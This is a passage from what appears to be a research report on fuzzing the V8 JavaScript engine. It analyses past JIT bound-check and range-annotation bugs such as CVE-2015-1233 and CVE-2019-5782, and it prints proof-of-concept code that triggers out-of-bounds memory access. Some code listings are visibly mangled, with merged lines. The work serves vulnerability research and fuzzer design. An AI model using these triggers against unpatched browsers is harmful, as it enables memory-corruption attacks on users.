After adding in the second iteration in line 6 the value 0x100000, the range changes to 
0x100000 to 0x10000f. The result of the add operation from line 7 is the range 
0x100000+0x7ffffff0 to 0x10000f+0x7ffffff0. If only the maximum range value would 
overflow, the compiler would again add code to deoptimize in such a case. However, since 
also the minimum range value overflows INT_MAX, a deoptimization would always occur. 
Because of this, the compiler changes the internal data type of the result of the add operation 
from line 7 to a float value. 
The root cause of the vulnerability is that the compiler already assumed in the first iteration 
that the data type is int and a deoptimization would be triggered when the result overflows 
INT_MAX. Only under this assumption the assumed value range of INT_MIN to 15 at the 
beginning of the second iteration is true. However, this assumption no longer holds because 
the code does not deoptimize because the data type changed from an integer to a float 
value. However, the bound check from line 5 was already removed which leads to OOB 
access in the second iteration in line 5. 
A detailed analysis is available in the issue report 150 from lokihardt. 
Generalization for variation analysis: 
• 
A fuzzer should add loops which execute two iterations and fuzz code in the loop 
body. 
• 
A fuzzer should generate mathematical calculations combined with array 
accesses. The result of calculations can sometimes be discarded because range 
calculations are performed internally during compilation. 
• 
Array access operations should be inserted more frequently at the start of a loop 
instead of the end.  
• 
At the start of the test case an if condition ensures that the array length is at least 
16. This code is important for the removal of the later bound check. It is important 
that no other code is executed in between which could trigger side effects. 
150 https://bugs.chromium.org/p/project-zero/issues/detail?id=1390 
80 
Chromium issue 469058, CVE-2015-1233 – Incorrect bound check calculation 
Chromium issue 469058, which is mentioned in the CVE details, is still restricted and public 
writeups for this vulnerability do not exist. The CVE number was issued as “incorrect 
interaction with IPC (gamepad API)”, however, this title is related to the sandbox escape 
used in the submitted full chain Chrome exploit. 
According the Chrome blog 151 the vulnerability was fixed with version 41.0.2272.101.118. A 
code diff 152 to the previous version reveals in which v8 version the vulnerability was fixed. 
Since the vulnerability is related to v8, the diff in the DEPS file reveals that the bug was fixed 
between 
the 
v8 
commit 
cc2b2f487bfa07c4f8f33ac574a4580ad9ec0374 
and 
901b67916dc2626158f42af5b5c520ede8752da2.  
By checking the second commit log 153, the fix can easily be found by viewing the parent 
commit (2ae675fe2c64e97a7bebf8288fe427675b7063fa) which fixes the vulnerability. The 
commit message contains the string BUG=chromium:469148 which indicates that the correct 
issue is 469148 which is unrestricted and public available. This issue can alternatively be 
found by using the search functionality on the issue tracker to search for the original issue 
number 469058 because the issue details contain the string Part of a full Chrome exploit 
chain in issue 469058. 
01: function opt(array, offset, oob_byte) { 
02:     var base = -0x7FFFFFC1 + offset; 
03:     array[base - (-0x80000000)] = 0x4B; // +0x80000000 can’t be represented 
04:     array[base + 0x7FFFFFE1] = 0x4B; 
05:     array[base + 0x7FFFFFC1] = oob_byte; 
06: } 
07: function trigger_optimize() { 
08:     var array = new Uint8Array(0x40); 
09:     for (var i = 0; i >= 28; // real value i = 1, optimizer: i = 0 
06:     i *= 100000; // real value i = 100000, optimizer: i = 0 
07:     if (i > 3) { 
08:         return 0; 
09:     } else { 
10:         var arr = [0.1, 0.2, 0.3, 0.4]; 
11:         return arr[i];      // OOB access in compiled code 
12:     } 
13: } 
14: function trigger_optimization() { 
15:     for (var i = 0; i  [FastProperties] 
- Second print: map:  [DictionaryProperties] 
The identification of functions, which trigger side effects, can therefore be decoupled 
from the fuzzing which reduces the search space. Moreover, the identified side effect 
of a tested function can automatically be compared with the annotation of the function 
to detect similar flaws. 
159 https://bugs.chromium.org/p/chromium/issues/detail?id=888923 
160 http://phrack.org/papers/jit_exploitation.html 
161 https://github.com/vngkv123/aSiagaming/tree/master/Chrome-v8-Obect.create 
85 
Chromium 
issue 
906043, 
CVE-2019-5782 
(Tianfu 
Cup 
2018) 
– 
Incorrect 
arguments.length value range annotation 
01: function opt(arg) { 
02:     let x = arguments.length; 
03:     a1 = new Array(0x10); 
04:     a2 = new Array(2); a2[0] = 1.1; a2[1] = 1.1; 
05:     a1[(x >> 16) * 0xf00000] = 1.39064994160909e-309; // 0xffff00000000 
06: } 
07: var a1, a2; 
08: let small = [1.1];         // Argument array with one argument 
09: let large = [1.1, 1.1]; 
10: large.length = 65536;      // Create an argument array with 65536 arguments 
11: large.fill(1.1); 
12: for (let j = 0; j < 100000; j++) { 
13:     opt.apply(null, small);// Trigger optimization with a small number of arguments 
14: } 
15: opt.apply(null, large);    // Trigger the compiled code with a lot of arguments 
Arguments can be accessed inside functions via the special arguments object. The 